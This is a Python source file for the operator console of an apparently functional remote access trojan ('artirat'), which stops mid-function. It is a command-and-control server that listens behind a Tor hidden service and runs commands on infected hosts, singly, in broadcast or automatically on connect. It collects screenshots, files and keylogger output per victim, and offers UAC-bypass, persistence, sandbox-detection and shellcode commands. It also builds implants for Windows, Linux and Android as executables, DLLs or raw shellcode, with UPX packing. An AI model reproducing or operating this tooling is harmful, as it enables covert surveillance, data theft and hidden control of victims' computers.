#!/usr/bin/env python3
import argparse
import atexit
import base64
import os
import readline
import shutil
import select
import socket
import subprocess
import sys
import threading
import time

HISTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".c2_history")

HOST = "127.0.0.1"
PORT = 1337
BUFFER_SIZE = 16384
CONTROL_PORT = 9051
SOCKS_PORT = 9050

CLIENTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clients")
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")
STREAM_CONFIG_PATH = os.path.join(BASE_DIR, "stream_config.txt")
TORRC_PATH = os.path.join(BASE_DIR, "torrc")
AUTORUN_PATH = os.path.join(BASE_DIR, ".autorun_commands")
SYSTEM_TORRC_CANDIDATES = [
    "/data/data/com.termux/files/usr/etc/tor/torrc",
    "/etc/tor/torrc",
    os.path.expanduser("~/.tor/torrc"),
    os.path.expanduser("~/torrc"),
]

_stream_hidden = False


def _load_stream_config():
    global _stream_hidden
    try:
        with open(STREAM_CONFIG_PATH) as f:
            val = f.read().strip()
            _stream_hidden = val == "hidden"
    except FileNotFoundError:
        _stream_hidden = False


def _save_stream_config():
    try:
        with open(STREAM_CONFIG_PATH, "w") as f:
            f.write("hidden" if _stream_hidden else "visible")
    except Exception:
        pass


def _stream_msg(msg: str):
    if not _stream_hidden:
        print(msg)


class ClientManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.clients: dict[int, tuple] = {}
        self.greeted: set[int] = set()
        self.next_id = 1
        self.client_hostnames: dict[int, str] = {}
        self.client_dirs: dict[int, str] = {}
        self.screenshot_counter: dict[int, int] = {}
        self.autorun_cmds = self._load_autorun()

    def _load_autorun(self):
        try:
            with open(AUTORUN_PATH) as f:
                return f.read().strip()
        except FileNotFoundError:
            return ""

    def save_autorun(self, cmds: str):
        self.autorun_cmds = cmds
        with open(AUTORUN_PATH, "w") as f:
            f.write(cmds + "\n")

    def add(self, conn, addr) -> int:
        with self.lock:
            cid = self.next_id
            self.next_id += 1
            self.clients[cid] = (conn, addr)
            print(f"\n[Client {cid} connected from {addr}]")
        if self.autorun_cmds:
            threading.Thread(target=self._run_autorun, args=(cid,), daemon=True).start()
        return cid

    def _run_autorun(self, cid: int):
        with self.lock:
            client = self.clients.get(cid)
            if not client:
                return
            conn, addr = client
        for raw in self.autorun_cmds.split(";"):
            cmd = raw.strip()
            if not cmd:
                continue
            try:
                conn.sendall((cmd + "\n").encode())
                conn.settimeout(15)
                resp = recv_until_prompt(conn)
                if resp:
                    out = resp.decode(errors="ignore")
                    for line in out.split("\n"):
                        _stream_msg(f"[autorun:{cid}] {line.rstrip()}")
            except Exception:
                break
            finally:
                conn.settimeout(None)

    def remove(self, cid):
        with self.lock:
            self.greeted.discard(cid)
            self.client_hostnames.pop(cid, None)
            self.client_dirs.pop(cid, None)
            return self.clients.pop(cid, None)

    def list_clients(self):
        with self.lock:
            return dict(self.clients)

    def get(self, cid):
        with self.lock:
            return self.clients.get(cid)

    def mark_greeted(self, cid):
        with self.lock:
            self.greeted.add(cid)

    def has_greeted(self, cid) -> bool:
        with self.lock:
            return cid in self.greeted

    def set_hostname(self, cid: int, hostname: str):
        with self.lock:
            safe = "".join(c if c.isalnum() or c in "._-" else "_" for c in hostname)
            if not safe:
                safe = f"client_{cid}"
            self.client_hostnames[cid] = safe
            dirname = os.path.join(CLIENTS_DIR, f"client_{cid}_{safe}")
            self.client_dirs[cid] = dirname
            os.makedirs(dirname, exist_ok=True)

    def get_client_dir(self, cid: int) -> str | None:
        with self.lock:
            return self.client_dirs.get(cid)


def accept_clients(manager: ClientManager):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = srv.accept()
        manager.add(conn, addr)


def recv_until_prompt(conn, prompt=b"client >> ", timeout=15):
    data = b""
    conn.settimeout(timeout)
    try:
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                return None
            data += chunk
            if data.endswith(prompt):
                break
        return data
    except socket.timeout:
        return None
    finally:
        conn.settimeout(None)


def send_chunked_file(conn, cmd_prefix, fname):
    basename = os.path.basename(fname)
    with open(fname, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    conn.sendall(f"{cmd_prefix}-start {basename}\n".encode())
    for i in range(0, len(b64), 16384):
        chunk = b64[i:i+16384]
        conn.sendall(f"{cmd_prefix}-chunk {chunk}\n".encode())
    conn.sendall(f"{cmd_prefix}-end\n".encode())

def parse_file_response(out):
    lines = out.split("\n")
    fname = None
    accumulated = ""
    in_file = False
    for line in lines:
        line = line.strip()
        if line.startswith("[file-start] "):
            fname = line[13:]
            accumulated = ""
            in_file = True
        elif in_file and line.startswith("[file-chunk] "):
            accumulated += line[13:]
        elif in_file and line.startswith("[file-end] "):
            in_file = False
        elif line.startswith("[file] "):
            rest = line[7:]
            sp = rest.find(" ")
            if sp > 0:
                fname = rest[:sp]
                accumulated = rest[sp + 1:]
    if fname and accumulated:
        try:
            return fname, base64.b64decode(accumulated)
        except Exception:
            pass
    return None, None

CLIENT_COMMANDS = [
    "help", "/h", "/?",
    "cd",
    "screenshot",
    "upload",
    "download",
    "uac",
    "uac2",
    "persist",
    "check_elevated",
    "self_uac",
    "sandbox_detect",
    "portscan",
    "keylogger_start",
    "keylogger_stop",
    "exit", "quit",
    "background",
    "update_implant",
]

SHELL_COMMANDS = [
    "ls", "cat", "pwd", "whoami", "id", "uname", "ps", "df", "du",
    "mkdir", "rm", "cp", "mv", "chmod", "chown", "touch", "head",
    "tail", "grep", "find", "sort", "wc", "echo", "env", "export",
    "which", "type", "tree", "hostname", "ifconfig", "ip", "netstat",
    "ss", "route", "ping", "curl", "wget", "nc", "nslookup", "dig",
    "systemctl", "service", "journalctl", "kill", "pkill", "nohup",
    "crontab", "at", "history", "alias", "source", "time", "xargs",
    "tee", "cut", "tr", "sed", "awk", "diff", "patch", "tar", "gzip",
    "gunzip", "bzip2", "xz", "zip", "unzip", "scp", "rsync", "ssh",
    "su", "sudo", "passwd", "useradd", "usermod", "groupadd", "adduser",
    "apt", "apt-get", "yum", "dnf", "pacman", "pkg",
    "dir", "type", "copy", "move", "del", "ren", "findstr", "tasklist",
    "taskkill", "systeminfo", "ipconfig", "tracert", "net", "sc",
    "wmic", "reg", "schtasks", "mshta",
]

FILE_CMDS = {"download"}


def _interactive_completer(text, state):
    line = readline.get_line_buffer()
    parts = line.split()
    cmd = parts[0].strip() if parts else ""
    if cmd in FILE_CMDS:
        dirname = os.path.dirname(text) or "."
        basename = os.path.basename(text)
        try:
            entries = sorted(os.listdir(dirname))
        except OSError:
            entries = []
        matches = []
        for e in entries:
            if not e.startswith(basename):
                continue
            full = os.path.join(dirname, e)
            suffix = "/" if os.path.isdir(full) else " "
            display = e if dirname == "." else os.path.join(dirname, e)
            matches.append(display + suffix)
        if state < len(matches):
            return matches[state]
        return None
    if not parts or (len(parts) == 1 and not line.endswith(" ")):
        matches = [c for c in CLIENT_COMMANDS if c.startswith(text)]
        if state < len(matches):
            return matches[state]
        state -= len(matches)
        shell_matches = [c for c in SHELL_COMMANDS if c.startswith(text)]
        if state < len(shell_matches):
            return shell_matches[state]
    return None


def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initial=True):
    old_completer = readline.get_completer()
    old_delims = readline.get_completer_delims()
    readline.set_completer(_interactive_completer)
    readline.set_completer_delims(" \t\n")
    readline.parse_and_bind("tab: complete")
    prompt = ">> "
    if read_initial:
        try:
            initial = recv_until_prompt(conn, prompt.encode(), timeout=30)
        except KeyboardInterrupt:
            print()
            return _restore_completer("background", old_completer, old_delims)
        if initial is None:
            return _restore_completer("exit", old_completer, old_delims)
        init_text = initial.decode(errors="ignore")
        hostname_full = init_text.split(">>")[0].strip()
        if "@" in hostname_full:
            hostname = hostname_full.split("@", 1)[1].split("[")[0].strip()
        else:
            hostname = hostname_full.split("[")[0].strip()
        if not hostname:
            hostname = hostname_full
        manager.set_hostname(cid, hostname)
        print(init_text, end="", flush=True)

    def _drain_pending():
        try:
            conn.setblocking(0)
            data = b""
            try:
                while True:
                    try:
                        chunk = conn.recv(16384)
                        if not chunk:
                            break
                        data += chunk
                    except BlockingIOError:
                        break
            finally:
                conn.setblocking(1)
            if not data:
                return None, None
            out = data.decode(errors="replace")
            return parse_file_response(out)
        except:
            return None, None

    while True:
        kfname, kfdata = _drain_pending()
        if kfname == "keylog.txt" and kfdata:
            client_dir = manager.get_client_dir(cid)
            if client_dir:
                safe_hostname = manager.client_hostnames.get(cid, f"client_{cid}")
                log_path = os.path.join(client_dir, f"keylog_{safe_hostname}.txt")
                with open(log_path, "ab") as f:
                    f.write(kfdata)
                _stream_msg(f"\n[Keylogger data appended ({len(kfdata)} bytes)]")
            continue

        try:
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print()
            return _restore_completer("background", old_completer, old_delims)
        if not line:
            continue
        line = line.strip()
        if line in ("exit", "quit", "/quit"):
            try:
                conn.sendall((line + "\n").encode())
            except Exception:
                pass
            time.sleep(0.3)
            return _restore_completer("exit", old_completer, old_delims)
        if line == "background":
            return _restore_completer("background", old_completer, old_delims)
        try:
            if line.startswith("download "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                send_chunked_file(conn, "download", fname)
            elif line.startswith("shellcode "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    print("Usage: shellcode <filepath>")
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                with open(fname, "rb") as f:
                    data = f.read()
                b64 = base64.b64encode(data).decode()
                cmd = f"shellcode {b64}\n"
                conn.sendall(cmd.encode())
            else:
                conn.sendall((line + "\n").encode())
            conn.settimeout(15)
            try:
                response = recv_until_prompt(conn, prompt.encode())
            except KeyboardInterrupt:
                print()
                return _restore_completer("background", old_completer, old_delims)
            finally:
                conn.settimeout(None)
            if response is None:
                print("[Connection lost]")
                return _restore_completer("exit", old_completer, old_delims)
            out = response.decode(errors="ignore")
            if out.endswith(prompt):
                out = out[:-len(prompt)]
            out_clean = out.rstrip("\n")
            fname, fdata = parse_file_response(out_clean)
            if fname and fdata:
                client_dir = manager.get_client_dir(cid)
                if fname == "keylog.txt" and client_dir:
                    safe_hostname = manager.client_hostnames.get(cid, f"client_{cid}")
                    log_path = os.path.join(client_dir, f"keylog_{safe_hostname}.txt")
                    with open(log_path, "ab") as f:
                        f.write(fdata)
                    _stream_msg(f"[Keylogger data appended ({len(fdata)} bytes)]")
                elif client_dir:
                    if line.startswith("screenshot"):
                        with manager.lock:
                            n = manager.screenshot_counter.get(cid, 0) + 1
                            manager.screenshot_counter[cid] = n
                        ext = os.path.splitext(fname)[1] or ".png"
                        fname = f"screenshot_{n}{ext}"
                    save_path = os.path.join(client_dir, fname)
                    with open(save_path, "wb") as f:
                        f.write(fdata)
                    print(f"[Saved: {save_path} ({len(fdata)} bytes)]")
                else:
                    with open(fname, "wb") as f:
                        f.write(fdata)
                    print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
                out_lines = []
                for _line in out.split("\n"):
                    _lstripped = _line.lstrip()
                    if (_lstripped.startswith("[file] ") or
                        _lstripped.startswith("[file-start] ") or
                        _lstripped.startswith("[file-chunk] ") or
                        _lstripped.startswith("[file-end] ")):
                        continue
                    out_lines.append(_line)
                out = "\n".join(out_lines)
            print(out, end="", flush=True)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            print("\n[Connection lost]")
            return _restore_completer("exit", old_completer, old_delims)
        except Exception as e:
            print(f"Error: {e}")


def _restore_completer(result, old_completer, old_delims):
    if old_completer:
        readline.set_completer(old_completer)
    if old_delims:
        readline.set_completer_delims(old_delims)
    return result


def multi_run(manager: ClientManager, cmdline: str, timeout=15):
    clients = manager.list_clients()
    if not clients:
        print("No clients connected")
        return

    if cmdline.startswith("download "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        basename = os.path.basename(fname)
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        chunks = [b64[i:i+16384] for i in range(0, len(b64), 16384)]
        cmdline = f"download-start {basename}\n" + \
                  "\n".join(f"download-chunk {c}" for c in chunks) + \
                  f"\ndownload-end"
    elif cmdline.startswith("shellcode "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        cmdline = f"shellcode {b64}"

    print(f"[*] multi_run on {len(clients)} client(s): {cmdline}")
    results = {}
    threads = []
    lock = threading.Lock()

    def run(cid, conn):
        try:
            conn.settimeout(timeout)
            conn.sendall((cmdline + "\n").encode())
            response = b""
            while True:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                response += chunk
                if response.endswith(b">> "):
                    break
            conn.settimeout(None)
            with lock:
                results[cid] = response
        except socket.timeout:
            conn.settimeout(None)
            with lock:
                results[cid] = b"(command timed out)\n"
        except Exception as e:
            conn.settimeout(None)
            with lock:
                results[cid] = f"(error: {e})\n".encode()

    for cid, (conn, _) in clients.items():
        t = threading.Thread(target=run, args=(cid, conn))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for cid in sorted(results.keys()):
        data = results[cid]
        print(f"\n--- Client {cid} ---")
        out = data.decode(errors="ignore") if isinstance(data, bytes) else str(data)
        prompt = ">> "
        if out.endswith(prompt):
            out = out[:-len(prompt)]
        fname, fdata = parse_file_response(out)
        if fname and fdata:
            client_dir = manager.get_client_dir(cid)
            if client_dir:
                save_path = os.path.join(client_dir, f"multi_{fname}")
            else:
                save_path = f"multi_{cid}_{fname}"
            with open(save_path, "wb") as f:
                f.write(fdata)
            print(f"  [Saved: {save_path} ({len(fdata)} bytes)]")
        print(out, end="")


ALL_BUILD_TARGETS = [
    "windows", "linux", "linux32", "windows32", "android",
    "dll-windows", "dll-linux",
    "windows-shellcode", "windows32-shellcode", "linux-shellcode", "linux32-shellcode",
]
EXE_BUILD_TARGETS = [
    "windows", "linux", "linux32", "windows32", "android",
]


def _stream_cargo(cmd, cwd, env, verbose=False):
    process = None
    try:
        if verbose:
            process = subprocess.Popen(
                cmd, cwd=cwd, env=env,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            for line in process.stdout:
                print(line, end="", flush=True)
            process.wait()
            return process.returncode
        process = subprocess.Popen(
            cmd, cwd=cwd, env=env,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        process.wait()
        return process.returncode
    except KeyboardInterrupt:
        print("\n[!] Build aborted")
        if process:
            process.terminate()
            process.wait()
        return -1


def _clean_target(target_triple: str):
    target_dir = os.path.join(".", "artirat-client", "target", target_triple)
    release_dir = os.path.join(target_dir, "release")
    if os.path.exists(release_dir):
        for item in os.listdir(release_dir):
            item_path = os.path.join(release_dir, item)
            if os.path.isfile(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
        for item in os.listdir(target_dir):
            item_path = os.path.join(target_dir, item)
            if item != "release":
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)


def _dist_binaries(target_triple: str):
    release_dir = os.path.join(".", "artirat-client", "target", target_triple, "release")
    if not os.path.exists(release_dir):
        return
    dist_base = os.path.join(".", "dist", target_triple)

    # map extension -> subdirectory name
    ext_map = {
        ".dll":  "dll",
        ".so":   "so",
        ".exe":  "exe",
        "":      "bin",      # Linux ELF executables (no extension)
    }
    try:
        for item in os.listdir(release_dir):
            item_path = os.path.join(release_dir, item)
            if not os.path.isfile(item_path):
                continue
            name, ext = os.path.splitext(item)
            if name not in {"artirat_client", "libartirat_client"}:
                continue
            if ext not in ext_map:
                continue
            sub = ext_map[ext]
            sub_dir = os.path.join(dist_base, sub)
            os.makedirs(sub_dir, exist_ok=True)
            shutil.copy2(item_path, os.path.join(sub_dir, item))
            print(f"  -> dist/{target_triple}/{sub}/{item}")

        # Static library (.a) goes into lib/
        for item in os.listdir(release_dir):
            item_path = os.path.join(release_dir, item)
            if not os.path.isfile(item_path):
                continue
            name, ext = os.path.splitext(item)
            if name in {"artirat_client", "libartirat_client"} and ext == ".a":
                lib_dir = os.path.join(dist_base, "lib")
                os.makedirs(lib_dir, exist_ok=True)
                shutil.copy2(item_path, os.path.join(lib_dir, item))
                print(f"  -> dist/{target_triple}/lib/{item}")

        # C header
        h_path = os.path.join(".", "artirat-client", "artirat_client.h")
        if os.path.exists(h_path):
            hdr_dir = os.path.join(dist_base, "include")
            os.makedirs(hdr_dir, exist_ok=True)
            shutil.copy2(h_path, os.path.join(hdr_dir, "artirat_client.h"))
            print(f"  -> dist/{target_triple}/include/artirat_client.h")
    except Exception as e:
        print(f"[-] Failed to copy build artifacts: {e}")
        return
    _clean_target(target_triple)
    print(f"[*] Cleaned build artifacts for {target_triple}")


def build_client(target: str, verbose=False, static=False, upx=False):
    targets = {
        "windows": "x86_64-pc-windows-gnu",
        "linux": "x86_64-unknown-linux-gnu",
        "linux32": "i686-unknown-linux-gnu",
        "android": "aarch64-linux-android",
        "windows32": "i686-pc-windows-gnu",
        "dll-windows": "x86_64-pc-windows-gnu",
        "dll-linux": "x86_64-unknown-linux-gnu",
        "windows-shellcode": "x86_64-pc-windows-gnu",
        "windows32-shellcode": "i686-pc-windows-gnu",
        "linux-shellcode": "x86_64-unknown-linux-gnu",
        "linux32-shellcode": "i686-unknown-linux-gnu",
    }
    t = targets.get(target, target)
    is_shellcode = target.endswith("-shellcode")
    is_dll = target.startswith("dll-")
    kind = "SHELLCODE" if is_shellcode else ("DLL/SO" if is_dll else "EXE")
    result = subprocess.run(["rustup", "target", "list", "--installed"], capture_output=True, text=True)
    installed = set(result.stdout.strip().split()) if result.returncode == 0 else set()

    host_result = subprocess.run(["rustc", "-vV"], capture_output=True, text=True)
    host_target = None
    for line in host_result.stdout.split("\n"):
        if line.startswith("host:"):
            host_target = line.split(":", 1)[1].strip()
            break
    if host_target and host_target not in installed:
        print(f"[*] Installing host target {host_target}...")
        subprocess.run(["rustup", "target", "add", host_target], capture_output=True, text=True)
        installed.add(host_target)

    if t not in installed:
        print(f"[*] Installing rust target {t}...")
        inst = subprocess.run(["rustup", "target", "add", t], capture_output=True, text=True)
        if inst.returncode != 0:
            print(f"[-] Failed to install target {t}: {inst.stderr.strip()}")
            return False
        print(f"[+] Installed target {t}")
    print(f"[*] Building {kind} for {t} (this may take a while)...")
    env = os.environ.copy()
    if target == "android" or t == "aarch64-linux-android":
        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android-clang"

    rustflags = env.get("RUSTFLAGS", "")
    is_windows = "windows" in target
    if is_dll:
        cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
    else:
        if static:
            rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
        cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]

    abs_project_dir = os.path.abspath(os.path.join(".", "artirat-client"))
    home_dir = os.path.expanduser("~")
    rustflags = f"{rustflags} --remap-path-prefix={abs_project_dir}=src --remap-path-prefix={home_dir}=~".strip()

    if rustflags:
        env["RUSTFLAGS"] = rustflags

    rc = _stream_cargo(cmd, os.path.join(".", "artirat-client"), env, verbose)
    if rc != 0:
        print(f"[-] Build failed for {t} (exit code {rc})")
        return False

    if is_shellcode:
        src_name = "artirat_client" + (".exe" if "windows" in target else "")
        src_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
        out_name = f"artirat_client_{target}.bin"
        out_path = os.path.join(".", out_name)
        objcopy = "objcopy"
        if "windows" in target:
            objcopy = "x86_64-w64-mingw32-objcopy" if "32" not in target else "i686-w64-mingw32-objcopy"
        try:
            subprocess.run(
                [objcopy, "-O", "binary", src_path, out_path],
                capture_output=True, text=True, check=True
            )
            size = os.path.getsize(out_path)
            print(f"[+] Shellcode written to {out_name} ({size} bytes)")
        except FileNotFoundError:
            print(f"[-] {objcopy} not found — raw binary at {src_path} (not converted)")
            print(f"    Manually run: objcopy -O binary '{src_path}' '{out_name}'")
        except subprocess.CalledProcessError as e:
            print(f"[-] objcopy failed: {e.stderr or e}")
    _dist_binaries(t)
    if not is_shellcode:
        print(f"[+] Build succeeded for {t}")
        if upx and not is_shellcode:
            src_name = "artirat_client" + (".exe" if "windows" in target else "")
            if is_dll:
                src_name = "libartirat_client" + (".dll" if "windows" in target else ".so")
            bin_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
            if os.path.exists(bin_path):
                orig_size = os.path.getsize(bin_path)
                print(f"[*] Compressing with UPX... (original: {orig_size} bytes)")
                result = subprocess.run(
                    ["upx", "--force", bin_path],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    new_size = os.path.getsize(bin_path)
                    ratio = (1 - new_size / orig_size) * 100
                    print(f"[+] UPX compression complete: {new_size} bytes ({ratio:.1f}% reduction)")
                else:
                    print(f"[-] UPX failed: {result.stderr.strip()}")
            else:
                print(f"[-] UPX: binary not found at {bin_path}")

        _dist_binaries(t)

        # Also build shared/static library version (DLL/SO + .a) for non-dll, non-shellcode targets.
        if not is_dll:
            print(f"[*] Building shared library for {t}...")
            shared_env = env.copy()
            shared_rustflags = shared_env.get("RUSTFLAGS", "")
            # Remove +crt-static from shared library build (DLLs/SOs use dynamic CRT)
            shared_rustflags = shared_rustflags.replace("-C target-feature=+crt-static", "").strip()
            shared_rustflags = f"{shared_rustflags} --remap-path-prefix={abs_project_dir}=src --remap-path-prefix={home_dir}=~".strip()
            if shared_rustflags:
                shared_env["RUSTFLAGS"] = shared_rustflags
            shared_cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
            shared_rc = _stream_cargo(shared_cmd, os.path.join(".", "artirat-client"), shared_env, verbose)
            if shared_rc == 0:
                print(f"[+] Shared library build succeeded for {t}")
                _dist_binaries(t)
            else:
                print(f"[-] Shared library build failed for {t} (exit code {shared_rc})")

        # Generate C header with cbindgen
        print(f"[*] Generating C header with cbindgen...")
        cbindgen_code = subprocess.run(
            ["cargo", "install", "cbindgen", "--force"],
            capture_output=True, text=True
        )
        if cbindgen_code.returncode == 0 or "already installed" in cbindgen_code.stderr.lower():
            header_result = subprocess.run(
                ["cbindgen", "--crate", "artirat_client",
                 "--config", os.path.join(".", "artirat-client", "cbindgen.toml"),
                 "--output", os.path.join(".", "artirat-client", "artirat_client.h")],
                capture_output=True, text=True, cwd=os.path.join(".", "artirat-client")
            )
            if header_result.returncode == 0:
                print(f"[+] C header generated: artirat_client.h")
            else:
                # Try without config
                header_result = subprocess.run(
                    ["cbindgen", "--crate", "artirat_client",
                     "--output", os.path.join(".", "artirat-client", "artirat_client.h")],
                    capture_output=True, text=True, cwd=os.path.join(".", "artirat-client")
                )
                if header_result.returncode == 0:
                    print(f"[+] C header generated: artirat_client.h")
                else:
                    print(f"[-] cbindgen failed: {header_result.stderr.strip()}")
        else:
            print(f"[-] cbindgen installation failed: {cbindgen_code.stderr.strip()}")
    return True


def setup_readline(completer):
    readline.set_completer(completer)
    readline.set_completer_delims(" \t\n")
    if hasattr(readline, "read_history_file"):
        try:
            readline.read_history_file(HISTFILE)
        except FileNotFoundError:
            pass
    atexit.register(lambda: readline.write_history_file(HISTFILE))


def c2_completer(text, state, manager=None):
    if manager is None:
        return None
    CMD2 = {"select", "build", "configure_tor", "autorun_commands"}
    CMD1 = {"list", "exit", "hide_stream", "show_stream", "write_config"}
    ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
    line = readline.get_line_buffer()
    parts = line.split()
    if not parts or (len(parts) == 1 and not line.endswith(" ")):
        prefix = parts[0] if parts else ""
        candidates = [c for c in ALL_CMDS if c.startswith(prefix)]
        return candidates[state] if state < len(candidates) else None
    cmd = parts[0]
    if line.endswith(" "):
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = ["all"] + ALL_BUILD_TARGETS
            return candidates[state] if state < len(candidates) else None
        return None
    if cmd in CMD2 and len(parts) == 2:
        arg = parts[1]
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids if str(i).startswith(arg)]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = [t for t in (["all"] + ALL_BUILD_TARGETS) if t.startswith(arg)]
            return candidates[state] if state < len(candidates) else None
    return None


def c2_menu(manager: ClientManager):
    def comp(text, state):
        return c2_completer(text, state, manager)
    readline.parse_and_bind("tab: complete")
    setup_readline(comp)
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0]
        if cmd == "list":
            clients = manager.list_clients()
            if not clients:
                print("No clients connected")
            else:
                for cid, (_, addr) in clients.items():
                    print(f"Client {cid} - {addr}")
        elif cmd == "select":
            if len(parts) < 2:
                print("Usage: select <id>")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print("Invalid id")
                continue
            client = manager.get(cid)
            if client is None:
                print(f"Client {cid} not found")
                continue
            conn, addr = client
            first_select = not manager.has_greeted(cid)
            if first_select:
                manager.mark_greeted(cid)
            print(f"[Selected client {cid}, entering interactive session]")
            print("[Type exit/quit to return to menu]")
            try:
                result = interactive_session(manager, conn, addr, cid, read_initial=first_select)
            except (EOFError, KeyboardInterrupt):
                print()
                result = "background"
            except Exception as e:
                print(f"Session error: {e}")
                result = "exit"
            if result == "exit":
                manager.remove(cid)
                try:
                    conn.close()
                except Exception:
                    pass
                print(f"[Session with client {cid} ended]")
            else:
                print(f"[Backgrounded session with client {cid}]")
        elif cmd == "build":
            if len(parts) < 2:
                print("Usage: build <target> [--verbose] [--static] [--upx]")
                print("       build all [--verbose] [--static] [--upx]")
                print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                continue
            verbose = "--verbose" in parts
            static = "--static" in parts
            upx = "--upx" in parts
            target_arg = parts[1]
            if target_arg == "all":
                targets = EXE_BUILD_TARGETS
                for t in targets:
                    print(f"\n{'='*60}")
                    build_client(t, verbose=verbose, static=static, upx=upx)
                print(f"\n{'='*60}")
                print("[+] All builds finished")
            else:
                build_client(target_arg, verbose=verbose, static=static, upx=upx)
        elif cmd == "hide_stream":
            global _stream_hidden
            _stream_hidden = True
            _save_stream_config()
            print("[Stream messages hidden]")
        elif cmd == "show_stream":
            _stream_hidden = False
            _save_stream_config()
            print("[Stream messages visible]")
        elif cmd == "write_config":
            write_config()
        elif cmd == "configure_tor":
            port = int(parts[1]) if len(parts) > 1 else 1337
            configure_tor(port)
        elif cmd == "autorun_commands":
            if len(parts) < 2:
                print(f"Current autorun commands: {manager.autorun_cmds or '(none)'}")
                print("Usage: autorun_commands <semicolon-separated commands>")
                continue
            manager.save_autorun(line[len(cmd):].strip())
            print(f"[+] Autorun commands set to: {manager.autorun_cmds}")
        elif cmd == "multi_run":
            if len(parts) < 2:
                print("Usage: multi_run <command>")
                continue
            multi_run(manager, line[len(cmd):].strip())
        elif cmd == "exit":
            break
        else:
            print("Commands: list, select <id>, multi_run <cmd>, build <target>, write_config, configure_tor [port], autorun_commands, exit")


def find_system_torrc():
    for p in SYSTEM_TORRC_CANDIDATES:
        if os.path.exists(p):
            return p
    if os.path.exists(TORRC_PATH):
        return TORRC_PATH
    return None


def parse_torrc(path=None):
    services = []
    if path is None:
        path = find_system_torrc()
    if not path or not os.path.exists(path):
        return services
    with open(path) as f:
        lines = f.readlines()
    current_dir = None
    for line in lines:
        stripped = line.strip()
        if stripped.startswith("HiddenServiceDir"):
            current_dir = stripped.split(None, 1)[1].strip()
        elif stripped.startswith("HiddenServicePort") and current_dir:
            parts = stripped.split(None, 2)
            if len(parts) >= 3:
                services.append((current_dir, parts[1], parts[2]))
            else:
                services.append((current_dir, parts[1], ""))
            current_dir = None
    return services


def get_hostname_from_dir(hs_dir):
    hostname_file = os.path.join(hs_dir, "hostname")
    if os.path.exists(hostname_file):
        with open(hostname_file) as f:
            return f.read().strip()
    return None


def write_config():
    old_content = ""
    if os.path.exists(CLIENT_HOSTNAME_PATH):
        with open(CLIENT_HOSTNAME_PATH) as f:
            old_content = f.read()
    print(f"[Previous config]:\n{old_content.strip() or '(empty)'}")

    services = parse_torrc()
    lines = []
    for hs_dir, port, target in services:
        if "artirat" not in hs_dir.lower():
            continue
        hostname = get_hostname_from_dir(hs_dir)
        if hostname:
            lines.append(f"{hostname}:{port}")

    # Persistent hidden service hostname from disk (if available)
    hs_hostname = get_hostname_from_dir(os.path.join(SERVER_CONFIG_DIR, "hidden_service"))
    if hs_hostname:
        entry = f"{hs_hostname}:1337"
        if entry not in lines:
            lines.append(entry)
            print(f"[+] Using persistent hidden service: {hs_hostname}")
    else:
        print("[*] Persistent hidden service not yet configured — create one with configure_tor")
        print("    or set up manually in torrc")

    if lines:
        os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
